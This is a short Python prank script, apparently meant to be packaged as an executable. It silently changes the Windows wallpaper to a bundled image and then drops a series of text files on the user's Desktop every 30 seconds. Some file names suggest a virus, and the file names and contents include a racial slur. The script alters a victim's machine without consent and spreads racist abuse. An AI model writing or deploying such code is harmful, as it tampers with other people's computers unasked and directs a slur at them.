
import time
import os, sys, ctypes

def resource_path(filename):
    # Works both for script and frozen exe
    if getattr(sys, '_MEIPASS', False):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.abspath("."), filename)

# get image path
img = resource_path("ni.png")

# set wallpaper (Windows example)
ctypes.windll.user32.SystemParametersInfoW(20, 0, img, 3)

import os
import time


Names = ["Aura99999999","Aura 10000","Hancock","6 - 1","20 - 15 chess","NoAura","Sigma","ZORO","LOLL","SIGMA SIGMA","Virus","HAHAHAH","VirusLOL","nigga"]

# Get the user's home directory
i = 0
home = os.path.expanduser("~")
for x in range(1,8):


# Build the path to Desktop
 desktop = os.path.join(home, "Desktop", Names[i] + ".txt")
# Create and write to the file
 i += 1

 with open(desktop, "w") as f:
    f.write("Hello my Nigga.\n")
 time.sleep(30)


